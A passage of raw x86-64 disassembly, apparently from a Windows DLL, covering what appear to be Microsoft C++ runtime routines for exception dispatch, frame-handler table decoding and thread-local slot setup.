   180003969:	85 c0                	test   %eax,%eax
   18000396b:	74 12                	je     0x18000397f
   18000396d:	48 8b c3             	mov    %rbx,%rax
   180003970:	c7 43 78 fe ff ff ff 	movl   $0xfffffffe,0x78(%rbx)
   180003977:	48 8b de             	mov    %rsi,%rbx
   18000397a:	48 8b f0             	mov    %rax,%rsi
   18000397d:	eb 0d                	jmp    0x18000398c
   18000397f:	8b 0d ab 66 01 00    	mov    0x166ab(%rip),%ecx        # 0x18001a030
   180003985:	33 d2                	xor    %edx,%edx
   180003987:	e8 28 22 00 00       	call   0x180005bb4
   18000398c:	48 8b cb             	mov    %rbx,%rcx
   18000398f:	e8 2c 3e 00 00       	call   0x1800077c0
   180003994:	8b cf                	mov    %edi,%ecx
   180003996:	ff 15 2c c7 00 00    	call   *0xc72c(%rip)        # 0x1800100c8
   18000399c:	48 8b c6             	mov    %rsi,%rax
   18000399f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800039a4:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1800039a9:	48 83 c4 20          	add    $0x20,%rsp
   1800039ad:	5f                   	pop    %rdi
   1800039ae:	c3                   	ret
   1800039af:	cc                   	int3
   1800039b0:	48 83 ec 28          	sub    $0x28,%rsp
   1800039b4:	48 8d 0d a9 fe ff ff 	lea    -0x157(%rip),%rcx        # 0x180003864
   1800039bb:	e8 1c 21 00 00       	call   0x180005adc
   1800039c0:	89 05 6a 66 01 00    	mov    %eax,0x1666a(%rip)        # 0x18001a030
   1800039c6:	83 f8 ff             	cmp    $0xffffffff,%eax
   1800039c9:	74 25                	je     0x1800039f0
   1800039cb:	48 8d 15 2e 77 01 00 	lea    0x1772e(%rip),%rdx        # 0x18001b100
   1800039d2:	8b c8                	mov    %eax,%ecx
   1800039d4:	e8 db 21 00 00       	call   0x180005bb4
   1800039d9:	85 c0                	test   %eax,%eax
   1800039db:	74 0e                	je     0x1800039eb
   1800039dd:	c7 05 91 77 01 00 fe 	movl   $0xfffffffe,0x17791(%rip)        # 0x18001b178
   1800039e4:	ff ff ff 
   1800039e7:	b0 01                	mov    $0x1,%al
   1800039e9:	eb 07                	jmp    0x1800039f2
   1800039eb:	e8 08 00 00 00       	call   0x1800039f8
   1800039f0:	32 c0                	xor    %al,%al
   1800039f2:	48 83 c4 28          	add    $0x28,%rsp
   1800039f6:	c3                   	ret
   1800039f7:	cc                   	int3
   1800039f8:	48 83 ec 28          	sub    $0x28,%rsp
   1800039fc:	8b 0d 2e 66 01 00    	mov    0x1662e(%rip),%ecx        # 0x18001a030
   180003a02:	83 f9 ff             	cmp    $0xffffffff,%ecx
   180003a05:	74 0c                	je     0x180003a13
   180003a07:	e8 18 21 00 00       	call   0x180005b24
   180003a0c:	83 0d 1d 66 01 00 ff 	orl    $0xffffffff,0x1661d(%rip)        # 0x18001a030
   180003a13:	b0 01                	mov    $0x1,%al
   180003a15:	48 83 c4 28          	add    $0x28,%rsp
   180003a19:	c3                   	ret
   180003a1a:	cc                   	int3
   180003a1b:	cc                   	int3
   180003a1c:	4c 8b 02             	mov    (%rdx),%r8
   180003a1f:	e9 00 00 00 00       	jmp    0x180003a24
   180003a24:	48 8b c4             	mov    %rsp,%rax
   180003a27:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180003a2b:	48 89 70 10          	mov    %rsi,0x10(%rax)
   180003a2f:	48 89 78 18          	mov    %rdi,0x18(%rax)
   180003a33:	4c 89 70 20          	mov    %r14,0x20(%rax)
   180003a37:	83 79 10 00          	cmpl   $0x0,0x10(%rcx)
   180003a3b:	49 8b d8             	mov    %r8,%rbx
   180003a3e:	4c 8b d2             	mov    %rdx,%r10
   180003a41:	0f 84 ac 00 00 00    	je     0x180003af3
   180003a47:	4c 63 49 10          	movslq 0x10(%rcx),%r9
   180003a4b:	4c 8d 35 ae c5 ff ff 	lea    -0x3a52(%rip),%r14        # 0x180000000
   180003a52:	48 8b 7a 08          	mov    0x8(%rdx),%rdi
   180003a56:	33 f6                	xor    %esi,%esi
   180003a58:	4c 03 cf             	add    %rdi,%r9
   180003a5b:	83 ca ff             	or     $0xffffffff,%edx
   180003a5e:	45 33 c0             	xor    %r8d,%r8d
   180003a61:	41 0f b6 09          	movzbl (%r9),%ecx
   180003a65:	83 e1 0f             	and    $0xf,%ecx
   180003a68:	4a 0f be 84 31 c0 03 	movsbq 0x103c0(%rcx,%r14,1),%rax
   180003a6f:	01 00 
   180003a71:	42 8a 8c 31 d0 03 01 	mov    0x103d0(%rcx,%r14,1),%cl
   180003a78:	00 
   180003a79:	4c 2b c8             	sub    %rax,%r9
   180003a7c:	45 8b 59 fc          	mov    -0x4(%r9),%r11d
   180003a80:	41 d3 eb             	shr    %cl,%r11d
   180003a83:	45 85 db             	test   %r11d,%r11d
   180003a86:	74 6b                	je     0x180003af3
   180003a88:	49 8b 42 10          	mov    0x10(%r10),%rax
   180003a8c:	44 8b 10             	mov    (%rax),%r10d
   180003a8f:	41 0f b6 09          	movzbl (%r9),%ecx
   180003a93:	83 e1 0f             	and    $0xf,%ecx
   180003a96:	4a 0f be 84 31 c0 03 	movsbq 0x103c0(%rcx,%r14,1),%rax
   180003a9d:	01 00 
   180003a9f:	42 8a 8c 31 d0 03 01 	mov    0x103d0(%rcx,%r14,1),%cl
   180003aa6:	00 
   180003aa7:	4c 2b c8             	sub    %rax,%r9
   180003aaa:	41 8b 41 fc          	mov    -0x4(%r9),%eax
   180003aae:	d3 e8                	shr    %cl,%eax
   180003ab0:	03 f0                	add    %eax,%esi
   180003ab2:	8b c6                	mov    %esi,%eax
   180003ab4:	49 03 c2             	add    %r10,%rax
   180003ab7:	48 03 c7             	add    %rdi,%rax
   180003aba:	48 3b d8             	cmp    %rax,%rbx
   180003abd:	72 2b                	jb     0x180003aea
   180003abf:	41 0f b6 09          	movzbl (%r9),%ecx
   180003ac3:	41 ff c0             	inc    %r8d
   180003ac6:	83 e1 0f             	and    $0xf,%ecx
   180003ac9:	4a 0f be 84 31 c0 03 	movsbq 0x103c0(%rcx,%r14,1),%rax
   180003ad0:	01 00 
   180003ad2:	42 8a 8c 31 d0 03 01 	mov    0x103d0(%rcx,%r14,1),%cl
   180003ad9:	00 
   180003ada:	4c 2b c8             	sub    %rax,%r9
   180003add:	41 8b 51 fc          	mov    -0x4(%r9),%edx
   180003ae1:	d3 ea                	shr    %cl,%edx
   180003ae3:	ff ca                	dec    %edx
   180003ae5:	45 3b c3             	cmp    %r11d,%r8d
   180003ae8:	72 a5                	jb     0x180003a8f
   180003aea:	45 85 c0             	test   %r8d,%r8d
   180003aed:	74 04                	je     0x180003af3
   180003aef:	8b c2                	mov    %edx,%eax
   180003af1:	eb 03                	jmp    0x180003af6
   180003af3:	83 c8 ff             	or     $0xffffffff,%eax
   180003af6:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   180003afb:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
   180003b00:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
   180003b05:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   180003b0a:	c3                   	ret
   180003b0b:	cc                   	int3
   180003b0c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003b11:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180003b16:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   180003b1b:	41 55                	push   %r13
   180003b1d:	41 56                	push   %r14
   180003b1f:	41 57                	push   %r15
   180003b21:	48 83 ec 30          	sub    $0x30,%rsp
   180003b25:	4d 8b f1             	mov    %r9,%r14
   180003b28:	49 8b d8             	mov    %r8,%rbx
   180003b2b:	48 8b f2             	mov    %rdx,%rsi
   180003b2e:	4c 8b e9             	mov    %rcx,%r13
   180003b31:	33 ff                	xor    %edi,%edi
   180003b33:	41 39 78 08          	cmp    %edi,0x8(%r8)
   180003b37:	74 0f                	je     0x180003b48
   180003b39:	4d 63 78 08          	movslq 0x8(%r8),%r15
   180003b3d:	e8 de f4 ff ff       	call   0x180003020
   180003b42:	49 8d 14 07          	lea    (%r15,%rax,1),%rdx
   180003b46:	eb 06                	jmp    0x180003b4e
   180003b48:	48 8b d7             	mov    %rdi,%rdx
   180003b4b:	44 8b ff             	mov    %edi,%r15d
   180003b4e:	48 85 d2             	test   %rdx,%rdx
   180003b51:	0f 84 7a 01 00 00    	je     0x180003cd1
   180003b57:	45 85 ff             	test   %r15d,%r15d
   180003b5a:	74 11                	je     0x180003b6d
   180003b5c:	e8 bf f4 ff ff       	call   0x180003020
   180003b61:	48 8b c8             	mov    %rax,%rcx
   180003b64:	48 63 43 08          	movslq 0x8(%rbx),%rax
   180003b68:	48 03 c8             	add    %rax,%rcx
   180003b6b:	eb 03                	jmp    0x180003b70
   180003b6d:	48 8b cf             	mov    %rdi,%rcx
   180003b70:	40 38 79 10          	cmp    %dil,0x10(%rcx)
   180003b74:	0f 84 57 01 00 00    	je     0x180003cd1
   180003b7a:	39 7b 0c             	cmp    %edi,0xc(%rbx)
   180003b7d:	75 09                	jne    0x180003b88
   180003b7f:	39 7b 04             	cmp    %edi,0x4(%rbx)
   180003b82:	0f 8d 49 01 00 00    	jge    0x180003cd1
   180003b88:	39 7b 04             	cmp    %edi,0x4(%rbx)
   180003b8b:	7c 09                	jl     0x180003b96
   180003b8d:	8b 43 0c             	mov    0xc(%rbx),%eax
   180003b90:	48 03 06             	add    (%rsi),%rax
   180003b93:	48 8b f0             	mov    %rax,%rsi
   180003b96:	f6 43 04 80          	testb  $0x80,0x4(%rbx)
   180003b9a:	74 32                	je     0x180003bce
   180003b9c:	41 f6 06 10          	testb  $0x10,(%r14)
   180003ba0:	74 2c                	je     0x180003bce
   180003ba2:	48 8b 05 47 75 01 00 	mov    0x17547(%rip),%rax        # 0x18001b0f0
   180003ba9:	48 85 c0             	test   %rax,%rax
   180003bac:	74 20                	je     0x180003bce
   180003bae:	ff 15 b4 c6 00 00    	call   *0xc6b4(%rip)        # 0x180010268
   180003bb4:	48 85 c0             	test   %rax,%rax
   180003bb7:	0f 84 30 01 00 00    	je     0x180003ced
   180003bbd:	48 85 f6             	test   %rsi,%rsi
   180003bc0:	0f 84 27 01 00 00    	je     0x180003ced
   180003bc6:	48 89 06             	mov    %rax,(%rsi)
   180003bc9:	48 8b c8             	mov    %rax,%rcx
   180003bcc:	eb 60                	jmp    0x180003c2e
   180003bce:	f6 43 04 08          	testb  $0x8,0x4(%rbx)
   180003bd2:	74 1b                	je     0x180003bef
   180003bd4:	49 8b 4d 28          	mov    0x28(%r13),%rcx
   180003bd8:	48 85 c9             	test   %rcx,%rcx
   180003bdb:	0f 84 11 01 00 00    	je     0x180003cf2
   180003be1:	48 85 f6             	test   %rsi,%rsi
   180003be4:	0f 84 08 01 00 00    	je     0x180003cf2
   180003bea:	48 89 0e             	mov    %rcx,(%rsi)
   180003bed:	eb 3f                	jmp    0x180003c2e
   180003bef:	41 f6 06 01          	testb  $0x1,(%r14)
   180003bf3:	74 4a                	je     0x180003c3f
   180003bf5:	49 8b 55 28          	mov    0x28(%r13),%rdx
   180003bf9:	48 85 d2             	test   %rdx,%rdx
   180003bfc:	0f 84 f5 00 00 00    	je     0x180003cf7
   180003c02:	48 85 f6             	test   %rsi,%rsi
   180003c05:	0f 84 ec 00 00 00    	je     0x180003cf7
   180003c0b:	4d 63 46 14          	movslq 0x14(%r14),%r8
   180003c0f:	48 8b ce             	mov    %rsi,%rcx
   180003c12:	e8 99 21 00 00       	call   0x180005db0
   180003c17:	41 83 7e 14 08       	cmpl   $0x8,0x14(%r14)
   180003c1c:	0f 85 ab 00 00 00    	jne    0x180003ccd
   180003c22:	48 39 3e             	cmp    %rdi,(%rsi)
   180003c25:	0f 84 a2 00 00 00    	je     0x180003ccd
   180003c2b:	48 8b 0e             	mov    (%rsi),%rcx
   180003c2e:	49 8d 56 08          	lea    0x8(%r14),%rdx
   180003c32:	e8 a5 f5 ff ff       	call   0x1800031dc
   180003c37:	48 89 06             	mov    %rax,(%rsi)
   180003c3a:	e9 8e 00 00 00       	jmp    0x180003ccd
   180003c3f:	41 39 7e 18          	cmp    %edi,0x18(%r14)
   180003c43:	74 0f                	je     0x180003c54
   180003c45:	49 63 5e 18          	movslq 0x18(%r14),%rbx
   180003c49:	e8 e6 f3 ff ff       	call   0x180003034
   180003c4e:	48 8d 0c 03          	lea    (%rbx,%rax,1),%rcx
   180003c52:	eb 05                	jmp    0x180003c59
   180003c54:	48 8b cf             	mov    %rdi,%rcx
   180003c57:	8b df                	mov    %edi,%ebx
   180003c59:	48 85 c9             	test   %rcx,%rcx
   180003c5c:	75 34                	jne    0x180003c92
   180003c5e:	49 39 7d 28          	cmp    %rdi,0x28(%r13)
   180003c62:	0f 84 94 00 00 00    	je     0x180003cfc
   180003c68:	48 85 f6             	test   %rsi,%rsi
   180003c6b:	0f 84 8b 00 00 00    	je     0x180003cfc
   180003c71:	49 63 5e 14          	movslq 0x14(%r14),%rbx
   180003c75:	49 8d 56 08          	lea    0x8(%r14),%rdx
   180003c79:	49 8b 4d 28          	mov    0x28(%r13),%rcx
   180003c7d:	e8 5a f5 ff ff       	call   0x1800031dc
   180003c82:	48 8b d0             	mov    %rax,%rdx
   180003c85:	4c 8b c3             	mov    %rbx,%r8
   180003c88:	48 8b ce             	mov    %rsi,%rcx
   180003c8b:	e8 20 21 00 00       	call   0x180005db0
   180003c90:	eb 3b                	jmp    0x180003ccd
   180003c92:	49 39 7d 28          	cmp    %rdi,0x28(%r13)
   180003c96:	74 69                	je     0x180003d01
   180003c98:	48 85 f6             	test   %rsi,%rsi
   180003c9b:	74 64                	je     0x180003d01
   180003c9d:	85 db                	test   %ebx,%ebx
   180003c9f:	74 11                	je     0x180003cb2
   180003ca1:	e8 8e f3 ff ff       	call   0x180003034
   180003ca6:	48 8b c8             	mov    %rax,%rcx
   180003ca9:	49 63 46 18          	movslq 0x18(%r14),%rax
   180003cad:	48 03 c8             	add    %rax,%rcx
   180003cb0:	eb 03                	jmp    0x180003cb5
   180003cb2:	48 8b cf             	mov    %rdi,%rcx
   180003cb5:	48 85 c9             	test   %rcx,%rcx
   180003cb8:	74 47                	je     0x180003d01
   180003cba:	41 8a 06             	mov    (%r14),%al
   180003cbd:	24 04                	and    $0x4,%al
   180003cbf:	f6 d8                	neg    %al
   180003cc1:	1b c9                	sbb    %ecx,%ecx
   180003cc3:	f7 d9                	neg    %ecx
   180003cc5:	ff c1                	inc    %ecx
   180003cc7:	8b f9                	mov    %ecx,%edi
   180003cc9:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   180003ccd:	8b c7                	mov    %edi,%eax
   180003ccf:	eb 02                	jmp    0x180003cd3
   180003cd1:	33 c0                	xor    %eax,%eax
   180003cd3:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180003cd8:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   180003cdd:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   180003ce2:	48 83 c4 30          	add    $0x30,%rsp
   180003ce6:	41 5f                	pop    %r15
   180003ce8:	41 5e                	pop    %r14
   180003cea:	41 5d                	pop    %r13
   180003cec:	c3                   	ret
   180003ced:	e8 e2 3a 00 00       	call   0x1800077d4
   180003cf2:	e8 dd 3a 00 00       	call   0x1800077d4
   180003cf7:	e8 d8 3a 00 00       	call   0x1800077d4
   180003cfc:	e8 d3 3a 00 00       	call   0x1800077d4
   180003d01:	e8 ce 3a 00 00       	call   0x1800077d4
   180003d06:	90                   	nop
   180003d07:	e8 c8 3a 00 00       	call   0x1800077d4
   180003d0c:	90                   	nop
   180003d0d:	cc                   	int3
   180003d0e:	cc                   	int3
   180003d0f:	cc                   	int3
   180003d10:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003d15:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180003d1a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   180003d1f:	41 56                	push   %r14
   180003d21:	48 83 ec 20          	sub    $0x20,%rsp
   180003d25:	49 8b f9             	mov    %r9,%rdi
   180003d28:	4c 8b f1             	mov    %rcx,%r14
   180003d2b:	33 db                	xor    %ebx,%ebx
   180003d2d:	41 39 58 04          	cmp    %ebx,0x4(%r8)
   180003d31:	7d 05                	jge    0x180003d38
   180003d33:	48 8b f2             	mov    %rdx,%rsi
   180003d36:	eb 07                	jmp    0x180003d3f
   180003d38:	41 8b 70 0c          	mov    0xc(%r8),%esi
   180003d3c:	48 03 32             	add    (%rdx),%rsi
   180003d3f:	e8 c8 fd ff ff       	call   0x180003b0c
   180003d44:	83 e8 01             	sub    $0x1,%eax
   180003d47:	74 3c                	je     0x180003d85
   180003d49:	83 f8 01             	cmp    $0x1,%eax
   180003d4c:	75 67                	jne    0x180003db5
   180003d4e:	48 8d 57 08          	lea    0x8(%rdi),%rdx
   180003d52:	49 8b 4e 28          	mov    0x28(%r14),%rcx
   180003d56:	e8 81 f4 ff ff       	call   0x1800031dc
   180003d5b:	4c 8b f0             	mov    %rax,%r14
   180003d5e:	39 5f 18             	cmp    %ebx,0x18(%rdi)
   180003d61:	74 0c                	je     0x180003d6f
   180003d63:	e8 cc f2 ff ff       	call   0x180003034
   180003d68:	48 63 5f 18          	movslq 0x18(%rdi),%rbx
   180003d6c:	48 03 d8             	add    %rax,%rbx
   180003d6f:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   180003d75:	4d 8b c6             	mov    %r14,%r8
   180003d78:	48 8b d3             	mov    %rbx,%rdx
   180003d7b:	48 8b ce             	mov    %rsi,%rcx
   180003d7e:	e8 75 19 00 00       	call   0x1800056f8
   180003d83:	eb 30                	jmp    0x180003db5
   180003d85:	48 8d 57 08          	lea    0x8(%rdi),%rdx
   180003d89:	49 8b 4e 28          	mov    0x28(%r14),%rcx
   180003d8d:	e8 4a f4 ff ff       	call   0x1800031dc
   180003d92:	4c 8b f0             	mov    %rax,%r14
   180003d95:	39 5f 18             	cmp    %ebx,0x18(%rdi)
   180003d98:	74 0c                	je     0x180003da6
   180003d9a:	e8 95 f2 ff ff       	call   0x180003034
   180003d9f:	48 63 5f 18          	movslq 0x18(%rdi),%rbx
   180003da3:	48 03 d8             	add    %rax,%rbx
   180003da6:	4d 8b c6             	mov    %r14,%r8
   180003da9:	48 8b d3             	mov    %rbx,%rdx
   180003dac:	48 8b ce             	mov    %rsi,%rcx
   180003daf:	e8 38 19 00 00       	call   0x1800056ec
   180003db4:	90                   	nop
   180003db5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003dba:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180003dbf:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   180003dc4:	48 83 c4 20          	add    $0x20,%rsp
   180003dc8:	41 5e                	pop    %r14
   180003dca:	c3                   	ret
   180003dcb:	e8 04 3a 00 00       	call   0x1800077d4
   180003dd0:	90                   	nop
   180003dd1:	cc                   	int3
   180003dd2:	cc                   	int3
   180003dd3:	cc                   	int3
   180003dd4:	48 8b c4             	mov    %rsp,%rax
   180003dd7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180003ddb:	4c 89 40 18          	mov    %r8,0x18(%rax)
   180003ddf:	55                   	push   %rbp
   180003de0:	56                   	push   %rsi
   180003de1:	57                   	push   %rdi
   180003de2:	41 54                	push   %r12
   180003de4:	41 55                	push   %r13
   180003de6:	41 56                	push   %r14
   180003de8:	41 57                	push   %r15
   180003dea:	48 83 ec 60          	sub    $0x60,%rsp
   180003dee:	4c 8b ac 24 c0 00 00 	mov    0xc0(%rsp),%r13
   180003df5:	00 
   180003df6:	4d 8b f9             	mov    %r9,%r15
   180003df9:	4c 8b e2             	mov    %rdx,%r12
   180003dfc:	4c 8d 48 10          	lea    0x10(%rax),%r9
   180003e00:	48 8b e9             	mov    %rcx,%rbp
   180003e03:	4d 8b c5             	mov    %r13,%r8
   180003e06:	49 8b d7             	mov    %r15,%rdx
   180003e09:	49 8b cc             	mov    %r12,%rcx
   180003e0c:	e8 13 ed ff ff       	call   0x180002b24
   180003e11:	4c 8b 8c 24 d0 00 00 	mov    0xd0(%rsp),%r9
   180003e18:	00 
   180003e19:	4c 8b f0             	mov    %rax,%r14
   180003e1c:	48 8b b4 24 c8 00 00 	mov    0xc8(%rsp),%rsi
   180003e23:	00 
   180003e24:	4d 85 c9             	test   %r9,%r9
   180003e27:	74 0e                	je     0x180003e37
   180003e29:	4c 8b c6             	mov    %rsi,%r8
   180003e2c:	48 8b d0             	mov    %rax,%rdx
   180003e2f:	48 8b cd             	mov    %rbp,%rcx
   180003e32:	e8 d9 fe ff ff       	call   0x180003d10
   180003e37:	48 8b 8c 24 d8 00 00 	mov    0xd8(%rsp),%rcx
   180003e3e:	00 
   180003e3f:	8b 59 08             	mov    0x8(%rcx),%ebx
   180003e42:	8b 39                	mov    (%rcx),%edi
   180003e44:	e8 d7 f1 ff ff       	call   0x180003020
   180003e49:	48 63 4e 10          	movslq 0x10(%rsi),%rcx
   180003e4d:	4d 8b ce             	mov    %r14,%r9
   180003e50:	4c 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%r8
   180003e57:	00 
   180003e58:	48 03 c1             	add    %rcx,%rax
   180003e5b:	8a 8c 24 f8 00 00 00 	mov    0xf8(%rsp),%cl
   180003e62:	48 8b d5             	mov    %rbp,%rdx
   180003e65:	88 4c 24 50          	mov    %cl,0x50(%rsp)
   180003e69:	49 8b cc             	mov    %r12,%rcx
   180003e6c:	4c 89 7c 24 48       	mov    %r15,0x48(%rsp)
   180003e71:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   180003e76:	89 5c 24 38          	mov    %ebx,0x38(%rsp)
   180003e7a:	89 7c 24 30          	mov    %edi,0x30(%rsp)
   180003e7e:	4c 89 6c 24 28       	mov    %r13,0x28(%rsp)
   180003e83:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180003e88:	e8 23 ee ff ff       	call   0x180002cb0
   180003e8d:	48 8b 9c 24 a0 00 00 	mov    0xa0(%rsp),%rbx
   180003e94:	00 
   180003e95:	48 83 c4 60          	add    $0x60,%rsp
   180003e99:	41 5f                	pop    %r15
   180003e9b:	41 5e                	pop    %r14
   180003e9d:	41 5d                	pop    %r13
   180003e9f:	41 5c                	pop    %r12
   180003ea1:	5f                   	pop    %rdi
   180003ea2:	5e                   	pop    %rsi
   180003ea3:	5d                   	pop    %rbp
   180003ea4:	c3                   	ret
   180003ea5:	cc                   	int3
   180003ea6:	cc                   	int3
   180003ea7:	cc                   	int3
   180003ea8:	40 55                	rex push %rbp
   180003eaa:	53                   	push   %rbx
   180003eab:	56                   	push   %rsi
   180003eac:	57                   	push   %rdi
   180003ead:	41 54                	push   %r12
   180003eaf:	41 55                	push   %r13
   180003eb1:	41 56                	push   %r14
   180003eb3:	41 57                	push   %r15
   180003eb5:	48 8d ac 24 78 ff ff 	lea    -0x88(%rsp),%rbp
   180003ebc:	ff 
   180003ebd:	48 81 ec 88 01 00 00 	sub    $0x188,%rsp
   180003ec4:	48 8b 05 45 61 01 00 	mov    0x16145(%rip),%rax        # 0x18001a010
   180003ecb:	48 33 c4             	xor    %rsp,%rax
   180003ece:	48 89 45 70          	mov    %rax,0x70(%rbp)
   180003ed2:	4c 8b b5 f0 00 00 00 	mov    0xf0(%rbp),%r14
   180003ed9:	4c 8b fa             	mov    %rdx,%r15
   180003edc:	4c 8b a5 08 01 00 00 	mov    0x108(%rbp),%r12
   180003ee3:	48 8b d9             	mov    %rcx,%rbx
   180003ee6:	48 89 54 24 78       	mov    %rdx,0x78(%rsp)
   180003eeb:	49 8b ce             	mov    %r14,%rcx
   180003eee:	49 8b d1             	mov    %r9,%rdx
   180003ef1:	4c 89 65 a0          	mov    %r12,-0x60(%rbp)
   180003ef5:	49 8b f1             	mov    %r9,%rsi
   180003ef8:	c6 44 24 60 00       	movb   $0x0,0x60(%rsp)
   180003efd:	4d 8b e8             	mov    %r8,%r13
   180003f00:	e8 17 fb ff ff       	call   0x180003a1c
   180003f05:	83 7e 48 00          	cmpl   $0x0,0x48(%rsi)
   180003f09:	8b f8                	mov    %eax,%edi
   180003f0b:	74 17                	je     0x180003f24
   180003f0d:	e8 c2 f9 ff ff       	call   0x1800038d4
   180003f12:	83 78 78 fe          	cmpl   $0xfffffffe,0x78(%rax)
   180003f16:	0f 85 81 04 00 00    	jne    0x18000439d
   180003f1c:	8b 7e 48             	mov    0x48(%rsi),%edi
   180003f1f:	83 ef 02             	sub    $0x2,%edi
   180003f22:	eb 1f                	jmp    0x180003f43
   180003f24:	e8 ab f9 ff ff       	call   0x1800038d4
   180003f29:	83 78 78 fe          	cmpl   $0xfffffffe,0x78(%rax)
   180003f2d:	74 14                	je     0x180003f43
   180003f2f:	e8 a0 f9 ff ff       	call   0x1800038d4
   180003f34:	8b 78 78             	mov    0x78(%rax),%edi
   180003f37:	e8 98 f9 ff ff       	call   0x1800038d4
   180003f3c:	c7 40 78 fe ff ff ff 	movl   $0xfffffffe,0x78(%rax)
   180003f43:	83 ff ff             	cmp    $0xffffffff,%edi
   180003f46:	0f 8c 51 04 00 00    	jl     0x18000439d
   180003f4c:	41 83 7e 08 00       	cmpl   $0x0,0x8(%r14)
   180003f51:	4c 8d 05 a8 c0 ff ff 	lea    -0x3f58(%rip),%r8        # 0x180000000
   180003f58:	74 29                	je     0x180003f83
   180003f5a:	49 63 56 08          	movslq 0x8(%r14),%rdx
   180003f5e:	48 03 56 08          	add    0x8(%rsi),%rdx
   180003f62:	0f b6 0a             	movzbl (%rdx),%ecx
   180003f65:	83 e1 0f             	and    $0xf,%ecx
   180003f68:	4a 0f be 84 01 c0 03 	movsbq 0x103c0(%rcx,%r8,1),%rax
   180003f6f:	01 00 
   180003f71:	42 8a 8c 01 d0 03 01 	mov    0x103d0(%rcx,%r8,1),%cl
   180003f78:	00 
   180003f79:	48 2b d0             	sub    %rax,%rdx
   180003f7c:	8b 42 fc             	mov    -0x4(%rdx),%eax
   180003f7f:	d3 e8                	shr    %cl,%eax
   180003f81:	eb 02                	jmp    0x180003f85
   180003f83:	33 c0                	xor    %eax,%eax
   180003f85:	3b f8                	cmp    %eax,%edi
   180003f87:	0f 8d 10 04 00 00    	jge    0x18000439d
   180003f8d:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   180003f93:	0f 85 c4 00 00 00    	jne    0x18000405d
   180003f99:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   180003f9d:	0f 85 ba 00 00 00    	jne    0x18000405d
   180003fa3:	8b 43 20             	mov    0x20(%rbx),%eax
   180003fa6:	2d 20 05 93 19       	sub    $0x19930520,%eax
   180003fab:	83 f8 02             	cmp    $0x2,%eax
   180003fae:	0f 87 a9 00 00 00    	ja     0x18000405d
   180003fb4:	48 83 7b 30 00       	cmpq   $0x0,0x30(%rbx)
   180003fb9:	0f 85 9e 00 00 00    	jne    0x18000405d
   180003fbf:	e8 10 f9 ff ff       	call   0x1800038d4
   180003fc4:	48 83 78 20 00       	cmpq   $0x0,0x20(%rax)
   180003fc9:	0f 84 6c 03 00 00    	je     0x18000433b
   180003fcf:	e8 00 f9 ff ff       	call   0x1800038d4
   180003fd4:	48 8b 58 20          	mov    0x20(%rax),%rbx
   180003fd8:	e8 f7 f8 ff ff       	call   0x1800038d4
   180003fdd:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   180003fe1:	c6 44 24 60 01       	movb   $0x1,0x60(%rsp)
   180003fe6:	4c 8b 68 28          	mov    0x28(%rax),%r13
   180003fea:	e8 71 f0 ff ff       	call   0x180003060
   180003fef:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   180003ff5:	75 1e                	jne    0x180004015
   180003ff7:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   180003ffb:	75 18                	jne    0x180004015
   180003ffd:	8b 43 20             	mov    0x20(%rbx),%eax
   180004000:	2d 20 05 93 19       	sub    $0x19930520,%eax
   180004005:	83 f8 02             	cmp    $0x2,%eax
   180004008:	77 0b                	ja     0x180004015
   18000400a:	48 83 7b 30 00       	cmpq   $0x0,0x30(%rbx)
   18000400f:	0f 84 88 03 00 00    	je     0x18000439d
   180004015:	e8 ba f8 ff ff       	call   0x1800038d4
   18000401a:	48 83 78 38 00       	cmpq   $0x0,0x38(%rax)
   18000401f:	74 3c                	je     0x18000405d
   180004021:	e8 ae f8 ff ff       	call   0x1800038d4
   180004026:	4c 8b 78 38          	mov    0x38(%rax),%r15
   18000402a:	e8 a5 f8 ff ff       	call   0x1800038d4
   18000402f:	49 8b d7             	mov    %r15,%rdx
   180004032:	48 8b cb             	mov    %rbx,%rcx
   180004035:	48 83 60 38 00       	andq   $0x0,0x38(%rax)
   18000403a:	e8 95 14 00 00       	call   0x1800054d4
   18000403f:	84 c0                	test   %al,%al
   180004041:	75 15                	jne    0x180004058
   180004043:	49 8b cf             	mov    %r15,%rcx
   180004046:	e8 79 15 00 00       	call   0x1800055c4
   18000404b:	84 c0                	test   %al,%al
   18000404d:	0f 84 2c 03 00 00    	je     0x18000437f
   180004053:	e9 03 03 00 00       	jmp    0x18000435b
   180004058:	4c 8b 7c 24 78       	mov    0x78(%rsp),%r15
   18000405d:	4c 8b 46 08          	mov    0x8(%rsi),%r8
   180004061:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180004065:	49 8b d6             	mov    %r14,%rdx
   180004068:	e8 bb 0b 00 00       	call   0x180004c28
   18000406d:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   180004073:	0f 85 7a 02 00 00    	jne    0x1800042f3
   180004079:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
